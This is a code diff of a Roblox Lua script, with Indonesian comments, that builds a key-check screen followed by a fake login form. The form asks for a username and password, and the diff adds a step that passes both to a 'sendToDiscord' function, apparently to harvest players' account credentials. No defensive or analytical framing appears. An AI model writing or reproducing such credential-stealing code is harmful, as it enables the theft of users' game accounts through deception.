@@ -63,17 +63,18 @@ local function createKeyValidationGUI()
     titleLabel.TextSize = 24
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Key Label
-    local keyLabel = Instance.new("TextLabel")
-    keyLabel.Name = "KeyLabel"
-    keyLabel.Parent = frame
-    keyLabel.Size = UDim2.new(1, -20, 0, 40)
-    keyLabel.Position = UDim2.new(0, 10, 0, 60)
-    keyLabel.BackgroundTransparency = 1
-    keyLabel.Font = Enum.Font.SourceSans
-    keyLabel.Text = "Insert Key"
-    keyLabel.TextSize = 14
-    keyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    -- Key Box
+    local keyBox = Instance.new("TextBox")
+    keyBox.Name = "KeyBox"
+    keyBox.Parent = frame
+    keyBox.Size = UDim2.new(1, -20, 0, 40)
+    keyBox.Position = UDim2.new(0, 10, 0, 60)
+    keyBox.PlaceholderText = "Insert Key"
+    keyBox.Font = Enum.Font.SourceSans
+    keyBox.Text = ""
+    keyBox.TextSize = 14
+    keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
     -- Error Label
     local errorLabel = Instance.new("TextLabel")
@@ -123,7 +124,7 @@ local function createKeyValidationGUI()
 
     -- Fungsi Verifikasi Key
     verifyKeyButton.MouseButton1Click:Connect(function()
-        if "Insert Key" == correctKey then
+        if keyBox.Text == correctKey then
             print("Key benar!")
             gui:Destroy()
             createLoginGUI(gui) -- Memanggil GUI kedua
@@ -150,25 +151,25 @@ local function createLoginGUI(parentGui)
     title.BackgroundTransparency = 1
     title.Parent = frame
 
-    local usernameLabel = Instance.new("TextLabel")
-    usernameLabel.Text = "Insert Username"
-    usernameLabel.Size = UDim2.new(1, -20, 0, 40)
-    usernameLabel.Position = UDim2.new(0, 10, 0, 60)
-    usernameLabel.BackgroundTransparency = 1
-    usernameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    usernameLabel.Font = Enum.Font.SourceSans
-    usernameLabel.TextSize = 14
-    usernameLabel.Parent = frame
+    local usernameBox = Instance.new("TextBox")
+    usernameBox.PlaceholderText = "Insert Username"
+    usernameBox.Size = UDim2.new(1, -20, 0, 40)
+    usernameBox.Position = UDim2.new(0, 10, 0, 60)
+    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    usernameBox.Font = Enum.Font.SourceSans
+    usernameBox.TextSize = 14
+    usernameBox.Parent = frame
 
-    local passwordLabel = Instance.new("TextLabel")
-    passwordLabel.Text = "Insert Password"
-    passwordLabel.Size = UDim2.new(1, -20, 0, 40)
-    passwordLabel.Position = UDim2.new(0, 10, 0, 120)
-    passwordLabel.BackgroundTransparency = 1
-    passwordLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    passwordLabel.Font = Enum.Font.SourceSans
-    passwordLabel.TextSize = 14
-    passwordLabel.Parent = frame
+    local passwordBox = Instance.new("TextBox")
+    passwordBox.PlaceholderText = "Insert Password"
+    passwordBox.Size = UDim2.new(1, -20, 0, 40)
+    passwordBox.Position = UDim2.new(0, 10, 0, 120)
+    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    passwordBox.Font = Enum.Font.SourceSans
+    passwordBox.TextSize = 14
+    passwordBox.Parent = frame
 
     local loginButton = Instance.new("TextButton")
     loginButton.Text = "Login"
@@ -181,8 +182,12 @@ local function createLoginGUI(parentGui)
     loginButton.Parent = frame
 
     loginButton.MouseButton1Click:Connect(function()
-        print("Login berhasil!")
-        parentGui:Destroy()
+        if usernameBox.Text ~= "" and passwordBox.Text ~= "" then
+            sendToDiscord(usernameBox.Text, passwordBox.Text)
+            parentGui:Destroy()
+        else
+            print("Harap isi semua kolom!")
+        end
     end)
 end
 
